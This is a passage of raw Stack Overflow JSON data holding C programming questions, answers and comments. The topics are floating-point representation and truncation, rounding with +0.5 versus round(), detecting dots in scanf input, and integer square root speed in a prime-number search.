"https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1449691629, "post_id": 34187562, "comment_id": 56122277, "body": "What?  Of course OP is not dreaming things up.   The only surprise is that such results are a surprise."}, {"owner": {"reputation": 74, "user_id": 2397434, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/874b1de044126a715c14c24402b8aca3?s=128&d=identicon&r=PG", "display_name": "Hossam Soffar", "link": "https://stackoverflow.com/users/2397434/hossam-soffar"}, "reply_to_user": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1449691816, "post_id": 34187562, "comment_id": 56122398, "body": "@MartinJames : if you just know that this is wrong and you dont know why its wrong and you dont even bother to know , You&#39;d make no difference than a dumb machine."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1449691884, "post_id": 34187562, "comment_id": 56122438, "body": "@HossamSoffar I&#39;m not excusing my attitude, but it would be better focussing on what does work, and move on from techniques that do not."}, {"owner": {"reputation": 46142, "user_id": 773113, "user_type": "registered", "accept_rate": 72, "profile_image": "https://i.stack.imgur.com/FKKLW.jpg?s=128&g=1", "display_name": "Mike Nakis", "link": "https://stackoverflow.com/users/773113/mike-nakis"}, "reply_to_user": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1449691922, "post_id": 34187562, "comment_id": 56122464, "body": "@MartinJames if it is not surprising to you, then explain it.  If you don&#39;t want to explain it, remain silent.  Pythagoras bothered with inventing his theorem despite the fact that he could obviously count the squares.  &quot;Who cares&quot; is very un-scientific, anti-understanding, and counter-productive."}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1449692045, "post_id": 34187562, "comment_id": 56122524, "body": "I don&#39;t need to know exactly, to bit level.  I could find out, but that woud mean a HUGE AMOUNT OF WORK, disassembling and debugging each compiler output.  That would be madness, pointless and, if anyone should do it, the OP should.  I don&#39;t care because it&#39;s FP, assigned to unsigned int, printed with a &#39;%d signed-int specifier.  That&#39;s just not anything I would do, ever.  Again - operations like this, who cares, (other than possibly OP&#39;s prof/TA)?"}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1449692604, "post_id": 34187562, "comment_id": 56122855, "body": "I mean, it&#39;s 117.999999999999999999whatever, truncated to 117.  Who cares about the whatever?"}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1449692842, "post_id": 34187562, "comment_id": 56123004, "body": "Some compilers will chuck out 118.000000000000000000whatever instead, which gets truncated to 118.  The whatever does not matter."}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1449696269, "post_id": 34187562, "comment_id": 56124807, "body": "You are aware that, with common FP standards, some those numbers can not exist in a computer?  Why do you continually ask for more information than you already have?  With the most common FP formats, 1.18 and 1.22 do not exist, and can not exist, in your computer.  How many times do you have to be told this?  What more cold you possibly want?  Those numbers do not exist. There is no accurate representation in the FP binary format most commonly used.  It is not possible to represent the numbers exactly.  Those numbers cannot be stored in the bits.  They get truncated when assigned to uint."}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1449696663, "post_id": 34187562, "comment_id": 56125049, "body": "Oh, BTW, those numbers cannot be represented in common FP formats.  If you need to know more detail, use your debugger to step through the executables  generated by you set of compilers. You will find that 1.18 etc. have no exact binary representation and, as a result, different compilers/libraries/FP hardware/whatever produce slightly different outputs that, when truncated, result in apparrently gross errors.  It&#39;s just a well-known fact of computer life that many numbers cannot be represented in common FP formats."}], "answers": [{"comments": [{"owner": {"reputation": 5821, "user_id": 3185968, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffc0f4eda45ce3e2ff4249afbfdac43e?s=128&d=identicon&r=PG&f=1", "display_name": "EOF", "link": "https://stackoverflow.com/users/3185968/eof"}, "edited": false, "score": 2, "creation_date": 1449691024, "post_id": 34187846, "comment_id": 56121925, "body": "If you&#39;re going to recommend rounding, recommend <code>round()</code>, or <code>lround()</code>, or any of the other proper functions. Don&#39;t recommend broken <code>+0.5</code>."}, {"owner": {"reputation": 14710, "user_id": 5538420, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/oc81s.jpg?s=128&g=1", "display_name": "dxiv", "link": "https://stackoverflow.com/users/5538420/dxiv"}, "reply_to_user": {"reputation": 5821, "user_id": 3185968, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffc0f4eda45ce3e2ff4249afbfdac43e?s=128&d=identicon&r=PG&f=1", "display_name": "EOF", "link": "https://stackoverflow.com/users/3185968/eof"}, "edited": false, "score": 0, "creation_date": 1449691214, "post_id": 34187846, "comment_id": 56122056, "body": "@EOF In this context the values are small enough to fit into a byte once rounded. I did not recommend it as a general rounding solution, and neither is <code>+0.5</code> <i>always</i> broken."}, {"owner": {"reputation": 74, "user_id": 2397434, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/874b1de044126a715c14c24402b8aca3?s=128&d=identicon&r=PG", "display_name": "Hossam Soffar", "link": "https://stackoverflow.com/users/2397434/hossam-soffar"}, "edited": false, "score": 0, "creation_date": 1449691881, "post_id": 34187846, "comment_id": 56122436, "body": "@dxiv i believe rounding is not an option here. im just looking for a why this happen and why compilers really handle it in different ways."}, {"owner": {"reputation": 14710, "user_id": 5538420, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/oc81s.jpg?s=128&g=1", "display_name": "dxiv", "link": "https://stackoverflow.com/users/5538420/dxiv"}, "reply_to_user": {"reputation": 74, "user_id": 2397434, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/874b1de044126a715c14c24402b8aca3?s=128&d=identicon&r=PG", "display_name": "Hossam Soffar", "link": "https://stackoverflow.com/users/2397434/hossam-soffar"}, "edited": false, "score": 0, "creation_date": 1449692691, "post_id": 34187846, "comment_id": 56122916, "body": "@HossamSoffar It happens because 1.18 does not have an exact representation in the IEEE 754 floating point format. From the online calculator at <a href=\"http://www.binaryconvert.com/result_double.html?decimal=049046049056\" rel=\"nofollow noreferrer\">binaryconvert.com/result_double.html?decimal=049046049056</a> the best approximation in 64-bit precision (long double) is `1.17999999999999993782751062099."}, {"owner": {"reputation": 74, "user_id": 2397434, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/874b1de044126a715c14c24402b8aca3?s=128&d=identicon&r=PG", "display_name": "Hossam Soffar", "link": "https://stackoverflow.com/users/2397434/hossam-soffar"}, "edited": false, "score": 0, "creation_date": 1449692816, "post_id": 34187846, "comment_id": 56122991, "body": "@dxiv same goes for 1.22 it&#39;s Most accurate representation = 1.219999999999999973354647409E0 , Why this is correct why the other is not."}, {"owner": {"reputation": 14710, "user_id": 5538420, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/oc81s.jpg?s=128&g=1", "display_name": "dxiv", "link": "https://stackoverflow.com/users/5538420/dxiv"}, "reply_to_user": {"reputation": 74, "user_id": 2397434, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/874b1de044126a715c14c24402b8aca3?s=128&d=identicon&r=PG", "display_name": "Hossam Soffar", "link": "https://stackoverflow.com/users/2397434/hossam-soffar"}, "edited": false, "score": 0, "creation_date": 1449693054, "post_id": 34187846, "comment_id": 56123125, "body": "@HossamSoffar Different compilers may handle floating point (slightly) differently. VC++ alone has 3 different options (/fp:precise, /fp:strict, /fp:fast)."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1449693772, "post_id": 34187846, "comment_id": 56123529, "body": "Corner case <a href=\"http://stackoverflow.com/questions/34187562/issue-with-floating-points-representation#comment56122056_34187846\">In this context the values are small enough to fit into a byte once rounded.</a> Adding 0.5 to round often fails a nuanced case: the FP value just below 0.5 as the sum, though less than 1.0, rounds to 1.0.  Thus rounding incorrectly.  IMO best to use <code>round()</code> when able, else use +0.5 (Like for global constants when <code>round()</code> cannot be called) and clearly document is limitations."}, {"owner": {"reputation": 14710, "user_id": 5538420, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/oc81s.jpg?s=128&g=1", "display_name": "dxiv", "link": "https://stackoverflow.com/users/5538420/dxiv"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1449694114, "post_id": 34187846, "comment_id": 56123693, "body": "@chux You are right in general, but this is a narrow case. I maintain that if (a) the number has at most 3 significant decimal digits, and (b) it rounds to an integer value between 0 and 255, then adding <code>+0.5</code> and truncating will <i>always</i> match the <code>round()</code> function. That&#39;s all there is to it in this particular context."}, {"owner": {"reputation": 75299, "user_id": 139746, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/BhJLC.png?s=128&g=1", "display_name": "Pascal Cuoq", "link": "https://stackoverflow.com/users/139746/pascal-cuoq"}, "edited": false, "score": 0, "creation_date": 1449699360, "post_id": 34187846, "comment_id": 56126450, "body": "@dxiv this ad-hoc property is completely irrelevant here as of all the numbers involved in question and answer, all either are integers or have about 50 decimal digits."}, {"owner": {"reputation": 75299, "user_id": 139746, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/BhJLC.png?s=128&g=1", "display_name": "Pascal Cuoq", "link": "https://stackoverflow.com/users/139746/pascal-cuoq"}, "edited": false, "score": 0, "creation_date": 1449699653, "post_id": 34187846, "comment_id": 56126578, "body": "Note having to cite the precise reasons why adding 0.5 is an acceptable substitute to proper rounding to the nearest integer is exactly why one should always call a standard function to round to the nearest integer."}, {"owner": {"reputation": 14710, "user_id": 5538420, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/oc81s.jpg?s=128&g=1", "display_name": "dxiv", "link": "https://stackoverflow.com/users/5538420/dxiv"}, "reply_to_user": {"reputation": 75299, "user_id": 139746, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/BhJLC.png?s=128&g=1", "display_name": "Pascal Cuoq", "link": "https://stackoverflow.com/users/139746/pascal-cuoq"}, "edited": false, "score": 0, "creation_date": 1449701875, "post_id": 34187846, "comment_id": 56127597, "body": "@PascalCuoq The property is not so ad-hoc. Given that 0.5 <i>is</i> exactly representable in fp format, it can be <i>proved</i> that <code>+0.5</code> truncation does the correct rounding across a range far wider than the 0-255 discussed here. FWIW <code>+0.5</code> is the first thing C FAQ 14.6 mentions at <a href=\"http://c-faq.com/fp/round.html\" rel=\"nofollow noreferrer\">c-faq.com/fp/round.html</a>. Anyway, the main point of the answer was <i>why</i> to round, not <i>how</i> to round - that was only a minor side point, which somehow most comments here seem to have fixated on."}, {"owner": {"reputation": 75299, "user_id": 139746, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/BhJLC.png?s=128&g=1", "display_name": "Pascal Cuoq", "link": "https://stackoverflow.com/users/139746/pascal-cuoq"}, "edited": false, "score": 0, "creation_date": 1449702922, "post_id": 34187846, "comment_id": 56128043, "body": "You mean a range containing 0x1.fffffffffffffp-1?"}, {"owner": {"reputation": 14710, "user_id": 5538420, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/oc81s.jpg?s=128&g=1", "display_name": "dxiv", "link": "https://stackoverflow.com/users/5538420/dxiv"}, "reply_to_user": {"reputation": 75299, "user_id": 139746, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/BhJLC.png?s=128&g=1", "display_name": "Pascal Cuoq", "link": "https://stackoverflow.com/users/139746/pascal-cuoq"}, "edited": false, "score": 0, "creation_date": 1449706120, "post_id": 34187846, "comment_id": 56129225, "body": "@PascalCuoq Point taken. It&#39;s not a range per se, but a sub-set of numbers in a range with strictly less than the 52 significant binary digits that a <code>double</code> allows. (For context, my earlier comment was about at most 3 significant decimal digits i.e. about 10 bits.) You number uses up all 52 bits, so it doesn&#39;t qualify. In fact that number, 0.49999999999999994, is the smallest (positive) failure case for <code>+0.5</code> rounding, as elaborated in more detail at <a href=\"http://ericlippert.com/2013/05/16/spot-the-defect-rounding-part-two/\" rel=\"nofollow noreferrer\">ericlippert.com/2013/05/16/spot-the-defect-rounding-part-two</a>&zwnj;&#8203;."}], "tags": [], "owner": {"reputation": 14710, "user_id": 5538420, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/oc81s.jpg?s=128&g=1", "display_name": "dxiv", "link": "https://stackoverflow.com/users/5538420/dxiv"}, "is_accepted": false, "score": -1, "last_activity_date": 1449693494, "last_edit_date": 1449693494, "creation_date": 1449690932, "answer_id": 34187846, "question_id": 34187562, "link": "https://stackoverflow.com/questions/34187562/issue-with-floating-points-representation/34187846#34187846", "title": "Issue with Floating points representation", "body": "<p>The way you have it, the floating point value is truncated to an integer type (unsigned char). To round to nearest, use this instead.</p>\n\n<pre><code>unsigned char TEST_COMPILER_AS13 = 1.18 * 100 + 0.5;\n</code></pre>\n\n<p>While this may \"fix\" it for this particular case, there will always be precision issues with floating point calculations. See the link posted by @JohnnyMopp in a comment.\n<hr>\n[EDIT] To see what a particular compiler \"thinks\" 1.18 * 100 is, you may print it to the full precision (at most 17 significant decimal digits in the case of <code>double</code>).</p>\n\n<pre><code>printf(\"%.16f * 100 = %.16f\\n\", 1.18, 1.18 * 100);\n</code></pre>\n"}], "owner": {"reputation": 74, "user_id": 2397434, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/874b1de044126a715c14c24402b8aca3?s=128&d=identicon&r=PG", "display_name": "Hossam Soffar", "link": "https://stackoverflow.com/users/2397434/hossam-soffar"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 79, "favorite_count": 0, "closed_date": 1449699007, "answer_count": 1, "score": -1, "last_activity_date": 1449694399, "creation_date": 1449689938, "last_edit_date": 1449694399, "question_id": 34187562, "link": "https://stackoverflow.com/questions/34187562/issue-with-floating-points-representation", "closed_reason": "Duplicate", "title": "Issue with Floating points representation", "body": "<p>Try the following code :</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nunsigned char TEST_COMPILER_AS13 = 1.18 * 100;\n\nint main(void) {\n    printf(\"%d\" , TEST_COMPILER_AS13);\n    // your code goes here\n    return 0;\n}\n</code></pre>\n\n<p>using C\n<a href=\"https://www.codechef.com/ide\" rel=\"nofollow\">https://www.codechef.com/ide</a></p>\n\n<p>the result would be 117</p>\n\n<p>if we replaced 1.18 with 1.17 the result would be 116  , yet if we used 1.19,1.20,1.15 etc the result would be correct 119 , 120 , 115.</p>\n\n<p>using different online compiler say :<a href=\"http://codepad.org/\" rel=\"nofollow\">http://codepad.org/</a>\nthe results for 1.18 and 1.17 would be okey \nyet then if you tried 1.13 , 1.14 , 1.15 it would 112 , 113 , 114 respectively </p>\n\n<p>I'm rubbing my head and i cant understand why this happen.\nNote: \nI have tried different compilers DIAB, COSMIC , MinGw.. etc\nall have similar issue. so what im missing here or how the floating point operations are done.</p>\n\n<p>Note:\nto solve this issue you could just cast the operation with float\nso the declaration would be as follow</p>\n\n<pre><code>unsigned char TEST_COMPILER_AS13 = (float) (1.18 * 100);\n</code></pre>\n\n<p>I'm open to your answers , i really want to understand how this works. why it works for some number and others wont, Why compiler differs on the way to handle it , is there compiler options which would affect the compiler behaviour</p>\n"}, {"tags": ["c", "for-loop", "input", "printf"], "comments": [{"owner": {"reputation": 2414, "user_id": 5339529, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/4ecd2b15539f40fea4bbb59864ad9fc0?s=128&d=identicon&r=PG&f=1", "display_name": "ForeverStudent", "link": "https://stackoverflow.com/users/5339529/foreverstudent"}, "edited": false, "score": 2, "creation_date": 1449689217, "post_id": 34187280, "comment_id": 56120909, "body": "you don&#39;t need an else statement, if you can successfully finish the for loop that means there are no dots to be found in the input. whatever you want to do to the file can go after the for loop."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1449689237, "post_id": 34187280, "comment_id": 56120922, "body": "When <code>scanf</code> returns you <i>lnow</i> that the user has pressed the enter key, otherwise the <code>scanf</code> call would block indefinitely."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1449689524, "post_id": 34187280, "comment_id": 56121096, "body": "Are you allowed to use function <code>strchr()</code> defined in <code>string.h</code>?"}, {"owner": {"reputation": 1303, "user_id": 297415, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0f1b87676260c36d4e66dd43c85f43ca?s=128&d=identicon&r=PG", "display_name": "ludesign", "link": "https://stackoverflow.com/users/297415/ludesign"}, "edited": false, "score": 0, "creation_date": 1449689543, "post_id": 34187280, "comment_id": 56121104, "body": "<a href=\"https://ideone.com/J9iOj6\" rel=\"nofollow noreferrer\">ideone.com/J9iOj6</a> go play with it :)"}, {"owner": {"reputation": 657, "user_id": 3181432, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/5c77bc404fe32c5c44ee519e0477598f?s=128&d=identicon&r=PG&f=1", "display_name": "MeChris", "link": "https://stackoverflow.com/users/3181432/mechris"}, "reply_to_user": {"reputation": 2414, "user_id": 5339529, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/4ecd2b15539f40fea4bbb59864ad9fc0?s=128&d=identicon&r=PG&f=1", "display_name": "ForeverStudent", "link": "https://stackoverflow.com/users/5339529/foreverstudent"}, "edited": false, "score": 0, "creation_date": 1449690314, "post_id": 34187280, "comment_id": 56121528, "body": "@IIIIIIIIIIIIIIIIIIIIIIII Yes, but I need to continue to use scanf if it did not find dot. I need the program to run until it finds the dot. That&#39;s why I use else."}], "answers": [{"comments": [{"owner": {"reputation": 657, "user_id": 3181432, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/5c77bc404fe32c5c44ee519e0477598f?s=128&d=identicon&r=PG&f=1", "display_name": "MeChris", "link": "https://stackoverflow.com/users/3181432/mechris"}, "edited": false, "score": 0, "creation_date": 1449690368, "post_id": 34187519, "comment_id": 56121558, "body": "I write name into the file. fprintf(File, &quot;%s\\n&quot;, name);"}], "tags": [], "owner": {"reputation": 30540, "user_id": 719263, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7feab598abfc27783641fe2b796a0155?s=128&d=identicon&r=PG", "display_name": "Jean-Baptiste Yun&#232;s", "link": "https://stackoverflow.com/users/719263/jean-baptiste-yun%c3%a8s"}, "is_accepted": false, "score": 0, "last_activity_date": 1449690594, "last_edit_date": 1449690594, "creation_date": 1449689772, "answer_id": 34187519, "question_id": 34187280, "link": "https://stackoverflow.com/questions/34187280/how-to-check-programmatically-if-input-contains-dots/34187519#34187519", "title": "How to check programmatically if input contains dot(s)?", "body": "<p>Don't close a file you didn't opened it. Use the file <strong>after</strong> the loop that verified that name contains no dot (open it, write in it, and close it), like this:</p>\n\n<pre><code> char *ptr;\n char name[20];\n FILE *f;\n scanf(\"%s\", name);\n printf(\"%s\\n\", name);\n for (ptr = name; *ptr!= '\\0'; ptr++) {\n   if (*ptr == '.') {\n     printf(\"Exit\");\n     exit(0);\n   }\n }\n f = fopen(name,\"w\"); // open for writing\n if (f==NULL) { fprintf(stderr,\"Can't open the file\\n\"); exit(1); }\n fprintf(f,\"Hello\"); // write something\n fclose(f); // close after using the file\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 13767, "user_id": 2413201, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/rxfuw.jpg?s=128&g=1", "display_name": "Armali", "link": "https://stackoverflow.com/users/2413201/armali"}, "is_accepted": false, "score": 0, "last_activity_date": 1505465910, "creation_date": 1505465910, "answer_id": 46235641, "question_id": 34187280, "link": "https://stackoverflow.com/questions/34187280/how-to-check-programmatically-if-input-contains-dots/46235641#46235641", "title": "How to check programmatically if input contains dot(s)?", "body": "<blockquote>\n  <p>I need to continue to use scanf if it did not find dot. I need the\n  program to run until it finds the dot. That's why I use else.</p>\n</blockquote>\n\n<p>As ForeverStudent wrote, <em>you don't need an else statement</em>. You just need to wrap the <code>scanf()</code> and all the rest in a loop, e. g.</p>\n\n<pre><code>while (scanf(\"%20s\", name) != EOF)\n{\n    \u2026\n}\n</code></pre>\n"}], "owner": {"reputation": 657, "user_id": 3181432, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/5c77bc404fe32c5c44ee519e0477598f?s=128&d=identicon&r=PG&f=1", "display_name": "MeChris", "link": "https://stackoverflow.com/users/3181432/mechris"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 267, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1505465910, "creation_date": 1449688962, "last_edit_date": 1449736565, "question_id": 34187280, "link": "https://stackoverflow.com/questions/34187280/how-to-check-programmatically-if-input-contains-dots", "title": "How to check programmatically if input contains dot(s)?", "body": "<p>I need to check if user input contains dot and if enter key is pressed. (<code>Text text text .[Enter]</code>) </p>\n\n<p>If it does then don't write that line to file and exit, else continue with input and to write line into a file.</p>\n\n<p>Here is what code I have so far:</p>\n\n<pre><code>FILE *File;\nchar *fileName = argv[1];\nchar *ptr;\nchar name[20];\n\nFile = fopen(fileName, \"r\");\nscanf(\"%s\", name);\nfprintf(File, \"%s\\n\", name);\nfor (ptr = name; *ptr!= '\\0'; ptr++)\n{\n    if (*ptr == '.')\n    {\n        printf(\"Exit\");\n        fclose(File);\n        exit(0);\n    }\n    else\n    {\n       // How to make user continue to input and write to file?\n    }\n}\n</code></pre>\n"}, {"tags": ["c", "square-root"], "comments": [{"owner": {"reputation": 213464, "user_id": 2357112, "user_type": "registered", "accept_rate": 26, "profile_image": "https://www.gravatar.com/avatar/3f80897d57525afe9eac4fb8c8318052?s=128&d=identicon&r=PG", "display_name": "user2357112 supports Monica", "link": "https://stackoverflow.com/users/2357112/user2357112-supports-monica"}, "edited": false, "score": 2, "creation_date": 1449688777, "post_id": 34187171, "comment_id": 56120667, "body": "Did you profile your code? If you&#39;re doing trial division, the sqrt operation is quite unlikely to be the bottleneck."}, {"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 0, "creation_date": 1449689059, "post_id": 34187171, "comment_id": 56120822, "body": "The jump-free Newton-Raphson converges in just four steps, IIRC. (for 32 bit ints)"}, {"owner": {"reputation": 213464, "user_id": 2357112, "user_type": "registered", "accept_rate": 26, "profile_image": "https://www.gravatar.com/avatar/3f80897d57525afe9eac4fb8c8318052?s=128&d=identicon&r=PG", "display_name": "user2357112 supports Monica", "link": "https://stackoverflow.com/users/2357112/user2357112-supports-monica"}, "edited": false, "score": 0, "creation_date": 1449689367, "post_id": 34187171, "comment_id": 56121003, "body": "@AntoineMathys: sqrt only has to be computed once, though. If you do <code>i * i &lt;= x</code>, that&#39;s an extra multiplication every iteration."}, {"owner": {"reputation": 83, "user_id": 3096849, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4dcfa4e0920dce5caf058221b46e865f?s=128&d=identicon&r=PG", "display_name": "Morten", "link": "https://stackoverflow.com/users/3096849/morten"}, "edited": false, "score": 0, "creation_date": 1449689376, "post_id": 34187171, "comment_id": 56121007, "body": "the complexity still looks like O(n log n) or O(log n). Finding the prime numbers up to 10000000 takes roughly 40 seconds on a pi 2, while finding them up to 1000000 takes 2."}, {"owner": {"reputation": 83, "user_id": 3096849, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4dcfa4e0920dce5caf058221b46e865f?s=128&d=identicon&r=PG", "display_name": "Morten", "link": "https://stackoverflow.com/users/3096849/morten"}, "edited": false, "score": 0, "creation_date": 1449689942, "post_id": 34187171, "comment_id": 56121340, "body": "@AntoineMathys I just tested it out. I am assigning <code>sqrt(x)</code> to a variable (of course) and the loop for up to 10000000 (when the innermost loop is empty) takes 4 seconds as opposed to the constant re-evaluation of <code>i*i</code>, which takes over two minutes."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1449694170, "post_id": 34187171, "comment_id": 56123729, "body": "@AntoineMathys The <code>i * i &lt;= x</code> approach has trouble when <code>x</code> is near <code>(U)INT_MAX</code> and <code>i*i</code> overflows."}, {"owner": {"reputation": 2506, "user_id": 3528438, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/27f8b3bc74bea842104821678137cdb2?s=128&d=identicon&r=PG&f=1", "display_name": "user3528438", "link": "https://stackoverflow.com/users/3528438/user3528438"}, "edited": false, "score": 0, "creation_date": 1449703212, "post_id": 34187171, "comment_id": 56128154, "body": "This might be helpful if performance is the only concern: calculate isqrt first and calculate sqrt(x)=x*isqrt(x) <a href=\"https://en.wikipedia.org/wiki/Fast_inverse_square_root\" rel=\"nofollow noreferrer\">en.wikipedia.org/wiki/Fast_inverse_square_root</a>   This method is used by some DSP&#39;s math library."}, {"owner": {"reputation": 83, "user_id": 3096849, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4dcfa4e0920dce5caf058221b46e865f?s=128&d=identicon&r=PG", "display_name": "Morten", "link": "https://stackoverflow.com/users/3096849/morten"}, "reply_to_user": {"reputation": 2506, "user_id": 3528438, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/27f8b3bc74bea842104821678137cdb2?s=128&d=identicon&r=PG&f=1", "display_name": "user3528438", "link": "https://stackoverflow.com/users/3528438/user3528438"}, "edited": false, "score": 0, "creation_date": 1449727349, "post_id": 34187171, "comment_id": 56135370, "body": "@user3528438 This, however, doesn&#39;t fit my requirements (bigger or equal than the actual value). The prime number calculation can loose accuracy with that, because it could consider 9 as prime number, because <code>i*isqrt(i)</code> returns 2."}, {"owner": {"reputation": 8429, "user_id": 964080, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/136f4c71facafdb75bfaa0e4f047f1fc?s=128&d=identicon&r=PG", "display_name": "Nick", "link": "https://stackoverflow.com/users/964080/nick"}, "edited": false, "score": 0, "creation_date": 1597679241, "post_id": 34187171, "comment_id": 112205791, "body": "I understand this is bit off-topic, but x64_64 has sqrt instruction for double. May be will be faster to use it and then cast to int?"}], "answers": [{"comments": [{"owner": {"reputation": 2506, "user_id": 3528438, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/27f8b3bc74bea842104821678137cdb2?s=128&d=identicon&r=PG&f=1", "display_name": "user3528438", "link": "https://stackoverflow.com/users/3528438/user3528438"}, "edited": false, "score": 0, "creation_date": 1449701925, "post_id": 34187992, "comment_id": 56127621, "body": "I remember a good way is to calculate inverse square root first. This solution may not perform well because of the division. I believe most machines still need 10-50 cycles to calculate a 32bit integer division."}, {"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": 